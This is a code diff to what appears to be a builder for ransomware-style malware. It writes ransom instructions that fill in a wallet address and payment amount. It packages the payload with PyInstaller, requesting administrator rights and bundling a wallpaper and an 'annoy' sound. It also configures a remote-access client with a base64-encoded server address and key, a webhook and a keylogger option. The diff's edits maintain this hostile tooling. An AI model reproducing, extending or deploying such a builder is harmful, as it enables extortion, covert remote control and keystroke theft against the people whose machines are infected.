@@ -80,7 +80,6 @@ class Main:
             
         }, headers={'content-type':'application/json'}).content
 
-        print(src)
         dir = os.path.dirname(os.path.realpath(__file__))
 
         with open('src\\output.py', 'wb') as file:
@@ -92,7 +91,7 @@ class Main:
         with open('src\\temp\\instructions.txt', 'w+') as file:
             file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))
 
-        command = ['pyinstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
@@ -233,7 +232,7 @@ class Main:
 
             rat_client = config['CONNECT_TO_SERVER'][0]
             if rat_client:
-                server_addr = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS'].encode()).decode()
+                server_addr = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS'].replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
                 server_key = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_KEY'].encode()).decode()
                 dynamic_webhook = config['CONNECT_TO_SERVER'][1]['DYNAMIC_WEBHOOK']
                 keylogger = config['KEYLOGGER']
